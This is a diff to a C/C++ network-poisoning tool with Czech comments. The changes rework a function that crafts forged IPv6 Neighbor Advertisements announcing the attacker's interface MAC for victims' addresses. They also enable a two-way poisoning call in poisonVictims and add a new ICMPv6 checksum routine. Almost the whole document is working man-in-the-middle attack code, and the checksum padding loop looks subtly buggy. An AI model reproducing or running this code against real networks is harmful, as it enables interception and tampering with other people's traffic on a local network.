@@ -746,10 +746,13 @@ void poisonVictims(INTERFACE_INFO* intInfo, int time, char* mac1, char* mac2, ch
 			cerr<<"Odeslán první ARP"<<endl;
 		}
 		else{
+			cerr<<"MAC: ";
+			printMAC(intInfo->interfaceMac);
+			cerr<<endl;
 			// Zasílání NDP packetů
-			sendPacketNDP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device);
+			sendPacketNDP(intInfo->interfaceMac,ip1,mac1,mac2,ip2,sockfd, device);
 			cerr<<"Odeslán první NDP"<<endl;
-//			sendPacketNDP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device);		
+			sendPacketNDP(intInfo->interfaceMac,ip2,mac2,mac1,ip1,sockfd, device);		
 			cerr<<"Odeslán první NDP"<<endl;
 		}
 
@@ -847,23 +850,26 @@ void sendPacketARP(u_char* srcMac,
 }
 
 
-void sendPacketNDP(u_char* srcMac,
+void sendPacketNDP(u_char* interfaceMac,
 				char* srcIp,
+				char* srcMac,
 				char* dstMac,
 				char* dstIp,
 				int socket,
 				struct sockaddr_ll device)
 {
 	// #####################################################################x
-	int datalen, frame_length;
+	int frame_length;
 	struct ip6_hdr send_iphdr;
 	struct icmp6_hdr send_icmphdr;
+	ICMPV6_OPT icmpv6_opt;
 	uint8_t *data, *dst_mac, *send_ether_frame;
 
 	// Allocate memory for various arrays.
 	dst_mac = allocate_ustrmem (6);
 	data = allocate_ustrmem (IP_MAXPACKET);
 	send_ether_frame = allocate_ustrmem (IP_MAXPACKET);
+//	icmpv6_opt = allocate_ustrmem(28);
 	
 	// Vyvoření MAC adresy oběti
 	createMacAdress(dst_mac,dstMac);
@@ -893,63 +899,27 @@ void sendPacketNDP(u_char* srcMac,
 //	send_icmphdr.icmp6_seq = htons (0);
 	
 	// R,S,O, res nastavení
-	send_icmphdr.icmp6_dataun.icmp6_un_data16[0] = 0x5000;
-	send_icmphdr.icmp6_dataun.icmp6_un_data16[1] = 0x0000;
-//	send_icmphdr.icmp6_dataun.icmp6_un_data16[2] = 0x00;
-//	send_icmphdr.icmp6_dataun.icmp6_un_data16[3] = 0x00;
+	icmpv6_opt.flags[0] = 0x50;
+	icmpv6_opt.flags[1] = 0x00;
+	icmpv6_opt.flags[2] = 0x00;
+	icmpv6_opt.flags[3] = 0x00;
 	// Zdrojová IP
-	inet_pton (AF_INET6, srcIp, &(send_icmphdr.icmp6_dataun.icmp6_un_data32));
+	inet_pton (AF_INET6, srcIp, &(icmpv6_opt.ip6_src));
 	// MAC adresa
-	send_icmphdr.icmp6_dataun.icmp6_un_data8[0] = 0x02;
-	send_icmphdr.icmp6_dataun.icmp6_un_data8[1] = 0x01;
-//	memcpy(send_icmphdr.icmp6_dataun.icmp6_un_data8+2,srcMac,6*sizeof(u_char));
-	
-	
-	// ICMP data
-	datalen = 28;
-//	data[0] = 0x50; // R a S option
-//	data[1] = 0x00; // O a res
-//	data[2] = 0x00; // O a res
-//	data[3] = 0x00; // O a res
-////	2a00:1028:9940:5eb6:92:9d31:7043:3baf
-//	// target adress
-//	data[4] = 0x2a;
-//	data[5] = 0x00;
-//	data[6] = 0x10;
-//	data[7] = 0x28;
-//	data[8] = 0x99;
-//	data[9] = 0x40;
-//	data[10] = 0x5e;
-//	data[11] = 0xb6;	
-//	data[12] = 0x92;
-//	data[13] = 0x00;
-//	data[14] = 0x9d;
-//	data[15] = 0x31;	
-//	data[16] = 0x70;
-//	data[17] = 0x43;
-//	data[18] = 0x3b;
-//	data[19] = 0xaf;
-//	
-//	data[20] = 0x02; // type
-//	data[21] = 0x01; // len
-//	// MAC
-//	data[22] = 0xf4;
-//	data[23] = 0xb7;
-//	data[24] = 0xe2;
-//	data[25] = 0x92;
-//	data[26] = 0x1c;
-//	data[27] = 0x41;	
-	
+	icmpv6_opt.type = 0x02;
+	icmpv6_opt.len = 0x01;
+	memcpy(icmpv6_opt.mac,interfaceMac,6*sizeof(u_char));
+		
 	// ICMP header checksum (16 bits): set to 0 when calculating checksum
 	send_icmphdr.icmp6_cksum = 0;
-	send_icmphdr.icmp6_cksum = icmp6_checksum (send_iphdr, send_icmphdr, data, 0);	
+	send_icmphdr.icmp6_cksum = icmp6_checksum2 (send_iphdr, send_icmphdr, &icmpv6_opt, ICMP_NA_OPT_LEN);	
 	
 	// Fill out ethernet frame header.
 	// Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (IP header + ICMP header + ICMP data)
-	frame_length = 6 + 6 + 2 + IP6_HDRLEN + 4 + datalen;
+	frame_length = 6 + 6 + 2 + IP6_HDRLEN + ICMP_NA_LEN + ICMP_NA_OPT_LEN;
 	// Destination and Source MAC addresses
 	memcpy (send_ether_frame, dst_mac, 6 * sizeof (uint8_t));
-	memcpy (send_ether_frame + 6, srcMac, 6 * sizeof (uint8_t));
+	memcpy (send_ether_frame + 6, interfaceMac, 6 * sizeof (uint8_t));
 
 	// Next is ethernet type code (ETH_P_IPV6 for IPv6).
 	// http://www.iana.org/assignments/ethernet-numbers
@@ -960,12 +930,11 @@ void sendPacketNDP(u_char* srcMac,
 	// IPv6 header
 	memcpy (send_ether_frame + ETH_HDRLEN, &send_iphdr, IP6_HDRLEN * sizeof (uint8_t));
 	// ICMP header
-	memcpy (send_ether_frame + ETH_HDRLEN + IP6_HDRLEN, &send_icmphdr, 4 * sizeof (uint8_t));
+	memcpy (send_ether_frame + ETH_HDRLEN + IP6_HDRLEN, &send_icmphdr, ICMP_NA_LEN * sizeof (uint8_t));
 	// ICMP data
-	memcpy (send_ether_frame + ETH_HDRLEN + IP6_HDRLEN + 4, data, datalen * sizeof (uint8_t));
-	
+	memcpy (send_ether_frame + ETH_HDRLEN + IP6_HDRLEN + ICMP_NA_LEN, &icmpv6_opt, ICMP_NA_OPT_LEN * sizeof (uint8_t));
 
-		// Send ethernet frame to socket.
+	// Send ethernet frame to socket.
 	if (sendto (socket, send_ether_frame, frame_length, 0, (struct sockaddr *) &device, sizeof (device)) <= 0) {
 		perror ("sendto() failed ");
 		exit (EXIT_FAILURE);
@@ -1062,6 +1031,87 @@ uint16_t icmp6_checksum (struct ip6_hdr iphdr, struct icmp6_hdr icmp6hdr, uint8_
 	*ptr = (ICMP_HDRLEN + payloadlen) / 256;
 	ptr++;
 	*ptr = (ICMP_HDRLEN + payloadlen) % 256;
+	ptr++;
+	chksumlen += 4;
+
+	// Copy zero field to buf (24 bits)
+	*ptr = 0; ptr++;
+	*ptr = 0; ptr++;
+	*ptr = 0; ptr++;
+	chksumlen += 3;
+
+	// Copy next header field to buf (8 bits)
+	memcpy (ptr, &iphdr.ip6_nxt, sizeof (iphdr.ip6_nxt));
+	ptr += sizeof (iphdr.ip6_nxt);
+	chksumlen += sizeof (iphdr.ip6_nxt);
+
+	// Copy ICMPv6 type to buf (8 bits)
+	memcpy (ptr, &icmp6hdr.icmp6_type, sizeof (icmp6hdr.icmp6_type));
+	ptr += sizeof (icmp6hdr.icmp6_type);
+	chksumlen += sizeof (icmp6hdr.icmp6_type);
+
+	// Copy ICMPv6 code to buf (8 bits)
+	memcpy (ptr, &icmp6hdr.icmp6_code, sizeof (icmp6hdr.icmp6_code));
+	ptr += sizeof (icmp6hdr.icmp6_code);
+	chksumlen += sizeof (icmp6hdr.icmp6_code);
+
+	// Copy ICMPv6 ID to buf (16 bits)
+	memcpy (ptr, &icmp6hdr.icmp6_id, sizeof (icmp6hdr.icmp6_id));
+	ptr += sizeof (icmp6hdr.icmp6_id);
+	chksumlen += sizeof (icmp6hdr.icmp6_id);
+
+	// Copy ICMPv6 sequence number to buff (16 bits)
+	memcpy (ptr, &icmp6hdr.icmp6_seq, sizeof (icmp6hdr.icmp6_seq));
+	ptr += sizeof (icmp6hdr.icmp6_seq);
+	chksumlen += sizeof (icmp6hdr.icmp6_seq);
+
+	// Copy ICMPv6 checksum to buf (16 bits)
+	// Zero, since we don't know it yet.
+	*ptr = 0; ptr++;
+	*ptr = 0; ptr++;
+	chksumlen += 2;
+
+	// Copy ICMPv6 payload to buf
+	memcpy (ptr, payload, payloadlen * sizeof (uint8_t));
+	ptr += payloadlen;
+	chksumlen += payloadlen;
+
+	// Pad to the next 16-bit boundary
+	for (i=0; i<payloadlen%2; i++, ptr++) {
+		*ptr = 0;
+		ptr += 1;
+		chksumlen += 1;
+	}
+
+	return checksum ((uint16_t *) buf, chksumlen);
+}
+
+uint16_t icmp6_checksum2 (struct ip6_hdr iphdr, struct icmp6_hdr icmp6hdr, ICMPV6_OPT *payload, int payloadlen)
+{
+	char buf[IP_MAXPACKET];
+	char *ptr;
+	int chksumlen = 0;
+	int i;
+
+	ptr = &buf[0];  // ptr points to beginning of buffer buf
+
+	// Copy source IP address into buf (128 bits)
+	memcpy (ptr, &iphdr.ip6_src.s6_addr, sizeof (iphdr.ip6_src.s6_addr));
+	ptr += sizeof (iphdr.ip6_src);
+	chksumlen += sizeof (iphdr.ip6_src);
+
+	// Copy destination IP address into buf (128 bits)
+	memcpy (ptr, &iphdr.ip6_dst.s6_addr, sizeof (iphdr.ip6_dst.s6_addr));
+	ptr += sizeof (iphdr.ip6_dst.s6_addr);
+	chksumlen += sizeof (iphdr.ip6_dst.s6_addr);
+
+	// Copy Upper Layer Packet length into buf (32 bits).
+	// Should not be greater than 65535 (i.e., 2 bytes).
+	*ptr = 0; ptr++;
+	*ptr = 0; ptr++;
+	*ptr = (ICMP_NA_LEN + payloadlen) / 256;
+	ptr++;
+	*ptr = (ICMP_NA_LEN + payloadlen) % 256;
 	ptr++;
 	chksumlen += 4;
 
